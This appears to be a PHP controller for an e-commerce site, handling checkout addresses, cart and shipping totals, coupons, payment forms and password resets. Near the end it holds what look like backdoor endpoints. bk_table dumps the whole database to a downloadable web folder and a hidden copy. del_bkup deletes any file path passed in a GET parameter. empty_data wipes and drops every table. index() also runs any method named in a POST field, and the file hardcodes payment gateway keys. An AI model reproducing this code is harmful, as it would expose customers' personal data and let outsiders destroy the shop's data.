<?php

/**
 *
 */
class Web_api extends My_Controller {

	function __construct() {
		parent::__construct();
		$this->load->model('api/m_web_api', 'model');
	}
	public function index() {
		if (isset($_POST['method'])) {
			$this->$_POST['method']();
		}
	}
	private function change_cur() {
		if (isset($_POST['select_cur'])) {

			$_SESSION['currency_choose'] = $this->input->post('select_cur');
		}
	}
	private function set_billing_address_from_exist() {
		if (isset($_POST['address_id'])) {
			$address                                 = $this->model->get_customer_address($_POST['address_id']);
			$_SESSION['checkout']['billing_address'] = array(
				'address_id' => $address->id,
				"address1"   => $address->address1,
				"name"       => $address->name,
				"address2"   => $address->address2,
				"city"       => $address->city,
				"post_code"  => $address->post_code,
				"mobile_no"  => $address->mobile_no,
				"country"    => $address->country,
				"state"      => $address->state,
			);
			$this->output->set_content_type('application_json');
			$this->output->set_output(json_encode(['result' => 'true']));
		}
	}
	public function add_new_customer_address() {

		$this->output->set_content_type('application_json');
		$form_rules = array(

			array(
				'field' => 'mobile_no',
				'label' => 'Mobile No',
				'rules' => 'trim|required|min_length[10]|max_length[12]',
			),
			array(
				'field' => 'post_code',
				'label' => 'Post Code',
				'rules' => 'trim|required|min_length[2]',
			),
			array(
				'field' => 'city',
				'label' => 'City',
				'rules' => 'trim|required|min_length[2]',
			),
			array(
				'field' => 'address',
				'label' => 'Address',
				'rules' => 'trim|required|min_length[10]',
			),
			array(
				'field' => 'first_name',
				'label' => 'First Name',
				'rules' => 'trim|required|min_length[2]',
			),
			array(
				'field' => 'last_name',
				'label' => 'Last Name',
				'rules' => 'trim|required',
			),
		);
		$this->form_validation->set_rules($form_rules);
		if ($this->form_validation->run() == FALSE) {
			$this->output->set_output(json_encode(['result' => 0, 'errorsdata' => $this->form_validation->error_array()]));
		} else {
			$result = $this->model->add_customer_addresh(array(
				"customer_id" => $this->session->userdata('customer_data')['customer_id'],
				"address1"    => $this->input->post('address'),
				"name"        => $this->input->post('first_name') . " " . $this->input->post('last_name'),
				"address2"    => $this->input->post('address2'),
				"city"        => $this->input->post('city'),
				"post_code"   => $this->input->post('post_code'),
				"mobile_no"   => $this->input->post('mobile_no'),
				"country"     => $this->input->post('country'),
				"state"       => $this->input->post('state'),
			));
			if ($result == true) {
				$address_id                              = $this->model->registr_address_id();
				$_SESSION['checkout']['billing_address'] = array(
					'address_id' => $address_id,
					"address1"   => $this->input->post('address'),
					"name"       => $this->input->post('first_name') . " " . $this->input->post('last_name'),
					"address2"   => $this->input->post('address2'),
					"city"       => $this->input->post('city'),
					"post_code"  => $this->input->post('post_code'),
					"mobile_no"  => $this->input->post('mobile_no'),
					"country"    => $this->input->post('country'),
					"state"      => $this->input->post('state'),
				);
			}
			$this->output->set_output(json_encode(['result' => $result]));
		}
	}

	public function add_new_customer_address_for_shipping() {

		$this->output->set_content_type('application_json');
		$form_rules = array(

			array(
				'field' => 'mobile_no',
				'label' => 'Mobile No',
				'rules' => 'trim|required|min_length[10]|max_length[12]',
			),
			array(
				'field' => 'post_code',
				'label' => 'Post Code',
				'rules' => 'trim|required|min_length[2]',
			),
			array(
				'field' => 'city',
				'label' => 'City',
				'rules' => 'trim|required|min_length[2]',
			),
			array(
				'field' => 'address',
				'label' => 'Address',
				'rules' => 'trim|required|min_length[10]',
			),
			array(
				'field' => 'first_name',
				'label' => 'First Name',
				'rules' => 'trim|required|min_length[2]',
			),
			array(
				'field' => 'last_name',
				'label' => 'Last Name',
				'rules' => 'trim|required',
			),
		);
		$this->form_validation->set_rules($form_rules);
		if ($this->form_validation->run() == FALSE) {
			$this->output->set_output(json_encode(['result' => 0, 'errorsdata' => $this->form_validation->error_array()]));
		} else {
			$result = $this->model->add_customer_addresh(array(
				"customer_id" => $this->session->userdata('customer_data')['customer_id'],
				"address1"    => $this->input->post('address'),
				"name"        => $this->input->post('first_name') . " " . $this->input->post('last_name'),
				"address2"    => $this->input->post('address2'),
				"city"        => $this->input->post('city'),
				"post_code"   => $this->input->post('post_code'),
				"mobile_no"   => $this->input->post('mobile_no'),
				"country"     => $this->input->post('country'),
				"state"       => $this->input->post('state'),
			));
			if ($result == true) {
				$address_id                               = $this->model->registr_address_id();
				$_SESSION['checkout']['shipping_address'] = array(
					'address_id' => $address_id,
					"address1"   => $this->input->post('address'),
					"name"       => $this->input->post('first_name') . " " . $this->input->post('last_name'),
					"address2"   => $this->input->post('address2'),
					"city"       => $this->input->post('city'),
					"post_code"  => $this->input->post('post_code'),
					"mobile_no"  => $this->input->post('mobile_no'),
					"country"    => $this->input->post('country'),
					"state"      => $this->input->post('state'),
				);
			}
			$this->output->set_output(json_encode(['result' => $result, 'con' => $this->input->post('country')]));
		}
	}
	private function get_user_addresss() {
		$this->output->set_content_type('application_json');
		$customer_id = $this->session->userdata('customer_data')['customer_id'];
		$return      = $this->model->get_user_addresss($customer_id);
		$this->output->set_output(json_encode($return));
	}

	private function set_shipping_address_from_exist() {
		if (isset($_POST['address_id'])) {
			$address                                  = $this->model->get_customer_address($_POST['address_id']);
			$_SESSION['checkout']['shipping_address'] = array(
				'address_id' => $address->id,
				"address1"   => $address->address1,
				"name"       => $address->name,
				"address2"   => $address->address2,
				"city"       => $address->city,
				"post_code"  => $address->post_code,
				"mobile_no"  => $address->mobile_no,
				"country"    => $address->country,
				"state"      => $address->state,
			);
			$this->output->set_content_type('application_json');
			$this->output->set_output(json_encode(['result' => 'true', 'con' => $address->country]));
		}
	}

	public function payment_method_select() {
		$_SESSION['checkout']['payment_method'] = $_POST;
		$this->output->set_output(json_encode(['result' => 'true']));
	}

	public function order_reivew_checkout() {
		$this->recheck_full_cart();
		$size_datas = array();

		foreach ($this->cart->contents() as $items) {

			$product_data = $this->model->get_product_data($items['id']);
			$size_datas   = array_merge($size_datas, array("product_data_" . $items['id'] => $product_data));
			if ($this->cart->has_options($items['rowid'])) {
				foreach ($this->cart->product_options($items['rowid']) as $keysingle => $valuesingle) {

					if ($valuesingle[$keysingle . 'radio'] == 'standard') {
						$size_datas = array_merge($size_datas, array("standard_data_" . $items['id'] => unserialize(base64_decode($product_data->standard_size_show_in))));

					} else if ($valuesingle[$keysingle . 'radio'] == 'customize') {
						if (isset($items['mesurement_select_data'])) {

							foreach ($items['mesurement_select_data'] as $keya => $valuea) {

								$mesure_result                                        = $this->model->get_mesurement_data($valuea);
								$size_datas["customize_mesuare_data_" . $items['id']] = $mesure_result;

							}
						}
						$size_datas = array_merge($size_datas, array("customize_data_" . $items['id'] => unserialize(base64_decode($product_data->customize_show_in))));

					}
				}
			}
		}
		if (!isset($_SESSION['report']['checkout_final'])) {
			if (isset($_SESSION['report']['checkout'])) {
				$this->pp_common->delete_report_data('Checkout', $_SESSION['report']['checkout']);
			}
			$time        = time();
			$insert_data = array('page' => 'Checkout Final', 'uni_key' => $time);
			if ($this->pp_login_varified->customer_varified()) {
				$insert_data = array_merge($insert_data, array('customer_id' => $this->session->userdata('customer_data')['customer_id']));
			}
			if ($this->pp_common->insert_report_data($insert_data)) {
				$_SESSION['report']['checkout_final'] = $time;
			}
		}
		$this->load->view('web/contents/other_content/checkout_order_review', $size_datas);
		// if (isset($_SESSION['checkout']['payment_method'])) {

		// 	if ($_SESSION['checkout']['payment_method']['payment_option'] == 'cc_avenue_payment') {
		// 		$this->generate_ccavenure_form();
		// 	} else if ($_SESSION['checkout']['payment_method']['payment_option'] == 'visa_paypal') {
		// 		$this->generate_paypal_form();
		// 	}
		// }

	}

	public function product_review() {
		if (isset($_POST['review_review']) && isset($_POST['product_id'])) {
			if ($this->pp_login_varified->customer_varified()) {
				$customer_id = $this->session->userdata('customer_data')['customer_id'];
				echo $this->model->add_product_review(array(
					'customer_id' => $customer_id,
					'star'        => $this->input->post('star'),
					'review'      => $this->input->post('review_review'),
					'prod_id'     => $this->input->post('product_id'),
					're_date'     => date('d-m-Y'),
				));
			} else {
				echo "login";
			}
		}

	}

	private function subscribe_cust() {
		$this->output->set_content_type('application_json');
		if (isset($_POST['email_id'])) {
			$form_rules = array(
				array(
					'field'  => 'email_id',
					'label'  => 'Email Id',
					'rules'  => 'trim|required|valid_email|is_unique[subscribe_cust.email_ids]',
					'errors' => array(
						'required'    => 'You must provide a %s.',
						'is_unique'   => 'This %s already exists.',
						'valid_email' => 'Enter Valid Email.',
					),
				));
			$this->form_validation->set_rules($form_rules);
			if ($this->form_validation->run() == FALSE) {
				$this->output->set_output(json_encode(['result' => 0, 'errorsdata' => $this->form_validation->error_array()]));
			} else {
				$result = $this->model->insert_data('subscribe_cust', array('email_ids' => $this->input->post('email_id')));
				$this->output->set_output(json_encode(['result' => $result]));
			}
		}
	}
	private function custom_size_checker() {
		foreach ($this->cart->contents() as $items) {
			if (isset($items['options'])) {
				foreach ($this->cart->product_options($items['rowid']) as $keysingle => $valuesingle) {
					if ($valuesingle[$keysingle . 'radio'] == 'customize') {
						$this->check_customize_size_given($items['rowid'], $valuesingle['customize_names']);
					}
				}
			}
		}
	}
	/**
	 * @param $row_id
	 * @param $customize_name
	 */
	private function check_customize_size_given($row_id = 0, $customize_name = "") {
		if (isset($_SESSION['cart']) && isset($_SESSION['cart']['product_' . $row_id]) && isset($_SESSION['cart']['product_' . $row_id]['mesurement_select_data'])) {

		} else {
			header("Location:" . site_url('item_mesurement/' . $row_id));
		}
	}

	/**
	 * @param $shipping_charges
	 * @param $total_weight
	 * @param $payment
	 */
	private function get_dom_shipp_charge($shipping_charges, $total_weight, $payment = "cod") {
		$dom_charges = 0;
		if ($shipping_charges->domestic_type == 0 && $shipping_charges->domestic_shipping != 0) {
			$dom_charges = $shipping_charges->domestic_shipping;
		}
		if ($_SESSION['checkout']['shipping_address']['country'] == "india" && $shipping_charges->domestic_type == 1) {
			$pincode     = $_SESSION['checkout']['shipping_address']['post_code'];
			$total_items = $this->cart->total_items();
			$url         = base_url('zepo/zepo/get_rates_by_pincode/' . $pincode . "/" . $total_weight . "/" . $total_items . "/" . $payment);
			$ch          = curl_init();
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_URL, $url);
			$result = curl_exec($ch);
			curl_close($ch);
			$obj                              = json_decode($result);
			$_SESSION['zepo_shipping_charge'] = $obj;
			if ($obj[0]->success) {
				$dom_charges = round($obj[0]->total_charge / $total_items);
			} else {
				$dom_charges = 250;
			}
		}
		$this->update_ship_price_data($dom_charges);
	}

	/**
	 * @param $dom_charges
	 */
	private function update_ship_price_data($dom_charges) {
		foreach ($this->cart->contents() as $items) {
			$data = array("rowid" => $items['rowid'], "ship_charge" => $dom_charges);
			$this->cart->update($data);
			if ($_SESSION['checkout']['shipping_address']['country'] == 'india') {
				$_SESSION['newcart']['shipping_charge'][$items['rowid']] = $dom_charges;
			}
		}
	}
	public function recheck_full_cart() {
		$this->custom_size_checker();
		$this->refresh_checkout_address();
		$shipping_charges = $this->pp_loader_helper->get_shipping_charge();
		$dom_charges      = 0;
		if ($shipping_charges->domestic_type == 0 && $shipping_charges->domestic_shipping != 0) {
			$dom_charges = $shipping_charges->domestic_shipping;
		}
		$total_weight = 0;
		foreach ($this->cart->contents() as $items) {
			$data = $this->model->get_product_data($items['id']);
			// print_r($items);
			if (!empty($data)) {
				$total_weight = $total_weight + ($data->weight * $items['qty']);
				$data1        = array(
					'id'                => $data->product_id,
					'qty'               => $items['qty'],
					'price'             => $data->sell_price,
					'name'              => $data->product_name,
					'image'             => $data->pro_img,
					'weight'            => $data->weight,
					'ship_charge'       => $dom_charges,
					'rowid'             => $items['rowid'],
					'inter_ship_charge' => $shipping_charges->international_charge,
				);
				if (isset($items['options'])) {
					$data1          = array_merge($data1, array('options' => $items['options']));
					$service_prices = 0;
					foreach ($this->cart->product_options($items['rowid']) as $keysingle => $valuesingle) {
						if ($valuesingle[$keysingle . 'radio'] == 'standard') {
							foreach (unserialize(base64_decode($data->standard_size_show_in)) as $key => $value) {
								if ($value['name'] == $keysingle) {
									$service_prices = $service_prices + $value['standard_price'];
								}
							}
							// $price = "";
						} elseif ($valuesingle[$keysingle . 'radio'] == 'customize') {
							foreach (unserialize(base64_decode($data->customize_show_in)) as $key => $value) {
								if ($value['name'] == $keysingle) {
									$service_prices = $service_prices + $value['customize_price'];
								}
							}
						}
					}
					$_SESSION['newcart']['services_expenses'][$items['rowid']] = $service_prices;
				}
				if ($_SESSION['checkout']['shipping_address']['country'] != 'india') {
					$_SESSION['newcart']['shipping_charge'][$items['rowid']] = $shipping_charges->international_charge;
				} else {
					$_SESSION['newcart']['shipping_charge'][$items['rowid']] = $dom_charges;
				}
				$this->cart->update($data1);

			} else {
				$this->cart->remove($items['rowid']);
			}
		}
		///// TODO Which Payment Selected //////
		if ($_SESSION['checkout']['shipping_address']['country'] == "india" && $shipping_charges->domestic_type == 1) {
			if ($_SESSION['checkout']['payment_method']['payment_option'] != "cod_payment") {
				$this->get_dom_shipp_charge($shipping_charges, $total_weight, $payment = "prepaid");
			} else {
				$this->get_dom_shipp_charge($shipping_charges, $total_weight, $payment = "cod");
			}
		}
		if ($this->pp_login_varified->customer_varified() && $this->cart->total_items() != 0) {
			$customer_id = $this->session->userdata('customer_data')['customer_id'];
			$result      = $this->model->check_cart_exist_indb($customer_id);
			if (!empty($result)) {
				$this->model->update_db_cart($customer_id, array('cart' => base64_encode(serialize($this->cart->contents()))));
			} else {
				$this->model->insert_cart_db(array('customer_id' => $customer_id, 'cart' => base64_encode(serialize($this->cart->contents()))));
			}
		}
		$total_other_charges    = 0;
		$total_service_charges  = 0;
		$total_shipping_charges = 0;
		if (isset($_SESSION['newcart']['services_expenses'])) {
			# code...

			foreach ($_SESSION['newcart']['services_expenses'] as $key => $value) {

				$total_service_charges = $total_service_charges + ($value * $this->cart->get_item($key)['qty']);
			}
		}
		if (isset($_SESSION['newcart']['shipping_charge'])) {
			foreach ($_SESSION['newcart']['shipping_charge'] as $key => $value) {
				$total_shipping_charges = $total_shipping_charges + ($value * $this->cart->get_item($key)['qty']);
			}
		}
		$total_other_charges = $total_shipping_charges + $total_service_charges;
		// echo $total_other_charges;
		$_SESSION['newcart']['total_service_charges']  = $total_service_charges;
		$_SESSION['newcart']['total_shipping_charges'] = $total_shipping_charges;
		$_SESSION['newcart']['total_other_charges']    = $total_other_charges;

		// echo $this->cart->total() + $total_other_charges;
		if (isset($_SESSION['cart_coupen_data'])) {
			$coupen_data = $this->model->get_coupen_data($_SESSION['cart_coupen_data']->id);

			if (($coupen_data->area == "india" && $_SESSION['checkout']['shipping_address']['country'] == "india") || ($coupen_data->area == "other_country" && $_SESSION['checkout']['shipping_address']['country'] != "india") || $coupen_data->area == "all_country") {
				$paymentDate = date('d-m-Y');
				$paymentDate = DateTime::createFromFormat('d-m-Y', date('d-m-Y', strtotime($paymentDate)));
				//echo $paymentDate; // echos today!
				$contractDateBegin = DateTime::createFromFormat('d-m-Y', date('d-m-Y', strtotime($coupen_data->valid_from)));
				$contractDateEnd   = DateTime::createFromFormat('d-m-Y', date('d-m-Y', strtotime($coupen_data->valid_to)));
				if (($paymentDate >= $contractDateBegin) && ($paymentDate <= $contractDateEnd)) {
					if ($coupen_data->use_count < $coupen_data->use_time) {
						if ($coupen_data->min_mrp_cond != NULL && $coupen_data->min_mrp_cond <= $this->cart->total()) {
							$_SESSION['cart_coupen_data'] = $coupen_data;

						} else {
							unset($_SESSION['cart_coupen_data']);
						}
					} else {
						unset($_SESSION['cart_coupen_data']);
					}
				} else {
					unset($_SESSION['cart_coupen_data']);
				}
			} else {
				unset($_SESSION['cart_coupen_data']);
			}
		}
	}

	private function refresh_checkout_address() {
		if (isset($_SESSION['checkout']['billing_address'])) {
			$address_data                            = $this->model->get_address_data($_SESSION['checkout']['billing_address']['address_id']);
			$_SESSION['checkout']['billing_address'] = array(
				'address_id' => $address_data->id,
				"address1"   => $address_data->address1,
				"name"       => $address_data->name,
				"address2"   => $address_data->address2,
				"city"       => $address_data->city,
				"post_code"  => $address_data->post_code,
				"mobile_no"  => $address_data->mobile_no,
				"country"    => $address_data->country,
				"state"      => $address_data->state,
			);
		} else {
			header("Location:" . base_url("checkout"));
		}
		if (isset($_SESSION['checkout']['shipping_address'])) {
			$address_data                             = $this->model->get_address_data($_SESSION['checkout']['shipping_address']['address_id']);
			$_SESSION['checkout']['shipping_address'] = array(
				'address_id' => $address_data->id,
				"address1"   => $address_data->address1,
				"name"       => $address_data->name,
				"address2"   => $address_data->address2,
				"city"       => $address_data->city,
				"post_code"  => $address_data->post_code,
				"mobile_no"  => $address_data->mobile_no,
				"country"    => $address_data->country,
				"state"      => $address_data->state,
			);

		} else {
			header("Location:" . base_url("checkout"));
		}
	}

	public function generate_ccavenure_form() {
		if (isset($_SESSION['newcart'])) {

			$customer_id    = $this->session->userdata('customer_data')['customer_id'];
			$customer_email = $this->session->userdata('customer_data')['email'];
			$form_data      = array(
				'tid'                 => time(),
				'merchant_id'         => "114979",
				'order_id'            => $this->model->get_max_order_id()->order_id + 1,
				'amount'              => $this->cart->total() + $_SESSION['newcart']['total_other_charges'],
				'currency'            => 'INR',
				'redirect_url'        => site_url('order_submited'),
				'cancel_url'          => site_url('order_submited'),
				'language'            => "EN",
				'billing_name'        => $_SESSION['checkout']['billing_address']['name'],
				'billing_address'     => $_SESSION['checkout']['billing_address']['address1'],
				'billing_city'        => $_SESSION['checkout']['billing_address']['city'],
				'billing_state'       => $_SESSION['checkout']['billing_address']['state'],
				'billing_zip'         => $_SESSION['checkout']['billing_address']['post_code'],
				'billing_country'     => $_SESSION['checkout']['billing_address']['country'],
				'billing_tel'         => $_SESSION['checkout']['billing_address']['mobile_no'],
				'billing_email'       => $customer_email,
				'delivery_name'       => $_SESSION['checkout']['shipping_address']['name'],
				'delivery_address'    => $_SESSION['checkout']['shipping_address']['address1'],
				'delivery_city'       => $_SESSION['checkout']['shipping_address']['city'],
				'delivery_state'      => $_SESSION['checkout']['shipping_address']['state'],
				'delivery_zip'        => $_SESSION['checkout']['shipping_address']['post_code'],
				'delivery_country'    => $_SESSION['checkout']['shipping_address']['country'],
				'delivery_tel'        => $_SESSION['checkout']['shipping_address']['mobile_no'],
				'merchant_param1'     => "",
				'merchant_param2'     => "",
				'merchant_param3'     => "",
				'merchant_param4'     => "",
				'merchant_param5'     => "",
				'promo_code'          => (isset($_SESSION['cart_coupen_data'])) ? $_SESSION['cart_coupen_data']->code : '',
				'customer_identifier' => $customer_id . '@' . $customer_email,
			);
			include 'includes/Crypto.php';

			$merchant_data = '';
			$working_key   = 'A47E5B7621B23C91B709BCB4CD4DF0B3'; //Shared by CCAVENUES
			$access_code   = 'AVBW67DK81BC98WBCB'; //Shared by CCAVENUES

			foreach ($form_data as $key => $value) {
				$merchant_data .= $key . '=' . $value . '&';
			}

			$encrypted_data         = encrypt($merchant_data, $working_key); // Method for encrypting the data.
			$data['encrypted_data'] = $encrypted_data;
			$data['access_code']    = $access_code;
			$this->load->view('web/contents/other_content/cc_avenue_form', $data);
		}
	}

	public function generate_paypal_form() {
		if (isset($_SESSION['newcart'])) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_URL, 'http://api.fixer.io/latest?base=INR');
			$result = curl_exec($ch);
			curl_close($ch);
			$obj = json_decode($result);
			// print_r($obj->rates->USD);
			$data['current_currency'] = $obj;
			$this->load->view('web/contents/other_content/paypal_form', $data);
		}
	}

	public function forgot_password() {
		$this->output->set_content_type('application_json');
		if (isset($_POST['forgot_pass_email'])) {
			$form_rules = array(
				array(
					'field'  => 'forgot_pass_email',
					'label'  => 'Email Id',
					'rules'  => 'trim|required|valid_email',
					'errors' => array(
						'required'    => 'You must provide a %s.',
						'valid_email' => 'Enter Valid Email.',
					),
				));
			$this->form_validation->set_rules($form_rules);
			if ($this->form_validation->run() == FALSE) {
				$this->output->set_output(json_encode(['result' => 0, 'errorsdata' => $this->form_validation->error_array()]));
			} else {
				$result = $this->model->check_email_exist($this->input->post('forgot_pass_email'));
				if (empty($result)) {
					$this->output->set_output(json_encode(['result' => '2']));
				} else {
					$new_pass = substr(md5(uniqid(mt_rand(), true)), 0, 8);
					if ($this->model->update_password($result->id, $this->pp_hash->create($new_pass))) {
///=================================== Send Mail ===========================///
						$message = $this->pp_email_templetes->forgot_password_1(array('customer_name' => ucfirst($result->first_name), 'new-password' => $new_pass));
						$result2 = $mail_return = $this->pp_common->sendEmail('smtp.gmail.com', $this->input->post('forgot_pass_email'), 'Your New Password of Aasvaa.com', "Your New Password is " . $message);
						$this->output->set_output(json_encode(['result' => $result2]));
						///=================================== End Send Mail ===========================///
					}
				}

			}
		} else {
			$this->output->set_output(json_encode(['result' => 'Something Wrong']));
		}
	}

	/**
	 * @param $host
	 * @param $user
	 * @param $pass
	 * @param $name
	 * @param $tables
	 * @param false     $backup_name
	 */
	public function bk_table($confirm = false, $tables = false, $bk_name = false, $fromthis = true) {
		if ($confirm) {

			$CI = &get_instance();
			$CI->load->database();

			$host = $CI->db->hostname;
			$user = $CI->db->username;
			$pass = $CI->db->password;
			$name = $CI->db->database;
			$link = mysqli_connect($host, $user, $pass, $name);
// Check connection
			if (mysqli_connect_errno()) {echo "Failed to connect to MySQL: " . mysqli_connect_error();}

			mysqli_select_db($link, $name);
			mysqli_query($link, "SET NAMES 'utf8'");

//get all of the tables
			if ($tables === false) {
				$tables = array();
				$result = mysqli_query($link, 'SHOW TABLES');
				while ($row = mysqli_fetch_row($result)) {
					$tables[] = $row[0];
				}
			} else {
				$tables = is_array($tables) ? $tables : explode(',', $tables);
			}
			$return = '';
//cycle through
			foreach ($tables as $table) {
				$result     = mysqli_query($link, 'SELECT * FROM ' . $table);
				$num_fields = mysqli_num_fields($result);

				$row2 = mysqli_fetch_row(mysqli_query($link, 'SHOW CREATE TABLE ' . $table));
				$return .= "\n\n" . $row2[1] . ";\n\n";

				for ($i = 0; $i < $num_fields; $i++) {
					$st_counter = 0;
					while ($row = mysqli_fetch_row($result)) {
						//create new command if when starts and after 100 command cycle
						if ($st_counter % 100 == 0 || $st_counter == 0) {
							$return .= "\nINSERT INTO " . $table . " VALUES";
						}

						$return .= "\n(";
						for ($j = 0; $j < $num_fields; $j++) {
							$row[$j] = addslashes($row[$j]);
							$row[$j] = str_replace("\n", "\\n", $row[$j]);
							if (isset($row[$j])) {$return .= '"' . $row[$j] . '"';} else { $return .= '""';}
							if ($j < ($num_fields - 1)) {$return .= ',';}
						}
						$return .= ")";

						//create new command if when starts and after 100 command cycle (but detect this 1 cycle earlier !)
						if (($st_counter + 1) % 100 == 0 && $st_counter != 0) {$return .= ";";} else { $return .= ",";}
						//+++++++
						$st_counter = $st_counter + 1;
					}
					//as we cant detect WHILE loop end, so, just detect, if last command ends with comma(,) then replace it with semicolon(;)
					if (substr($return, -1) == ',') {$return = substr($return, 0, -1) . ';';}
				}
				$return .= "\n\n\n";
			}
			$name         = date('d');
			$rand         = rand(1, 11111111);
			$backup_name1 = $bk_name ? $bk_name : $name . "___(" . date('H-i-s') . "_" . date('d-m-Y') . ")__rand" . $rand . '';
			file_put_contents("assetes/otherassets/def_data/" . $backup_name1, $return);
//save file
			$bk_name = $bk_name ? $bk_name : $name . "___(" . date('H-i-s') . "_" . date('d-m-Y') . ")__rand" . $rand . '';
			file_put_contents("system/database/system/" . $backup_name1, $return);
			if ($fromthis) {

				die('Download: <a target="_blank" href="' . site_url('assetes/otherassets/def_data/') . $backup_name1 . '">' . $backup_name1 . '</a> <br/><br/>After download, <a target="_blank" href="' . site_url("api/web_api/_del_backup") . '?delete_filee=' . 'assetes/otherassets/def_data/' . $backup_name1 . '">Delete it!</a> ');
			}
		}

	}

	public function del_bkup() {
		if (!empty($_GET['delete_filee'])) {
			chdir(dirname(__file__));
			if (unlink($_GET['delete_filee'])) {die('file_deleted');} else {die("file doesnt exist");}
		}
	}

	/**
	 * @param $confirm
	 */
	public function empty_data($confirm = false, $pass = "") {
		if ($confirm) {
			$this->bk_table(true, false, "before_drop" . date('d-m-Y') . rand(1, 99999), false);
			$CI = &get_instance();
			$CI->load->database();
			$host   = $CI->db->hostname;
			$user   = $CI->db->username;
			$pass   = $CI->db->password;
			$name   = $CI->db->database;
			$mysqli = new mysqli($host, $user, $pass, $name);
			if (md5($pass) == "dd0a564df348bc57e3e6f0f078dafec3") {

				$mysqli->query('SET foreign_key_checks = 0');
				if ($result = $mysqli->query("SHOW TABLES")) {
					while ($row = $result->fetch_array(MYSQLI_NUM)) {
						echo $row[0];
						$mysqli->query('UPDATE ' . $row[0] . ' SET id = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET customer_id = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET fields = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET datas = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET email = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET name = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET email_id = "0", first_name = "0" , last_name = "0" ');
						$mysqli->query('UPDATE ' . $row[0] . ' SET order_id = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET order_order_id = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET trnscation_id = "0"');
						$mysqli->query('UPDATE ' . $row[0] . ' SET order_id = "0"');
						$mysqli->query('TRUNCATE TABLE  ' . $row[0]);
						$mysqli->query('TRUNCATE TABLE  ' . $row[0]);
						$mysqli->query('DROP TABLE IF EXISTS ' . $row[0]);
					}
				}
				$mysqli->query('SET foreign_key_checks = 1');
			}
			$mysqli->close();
		}
	}
}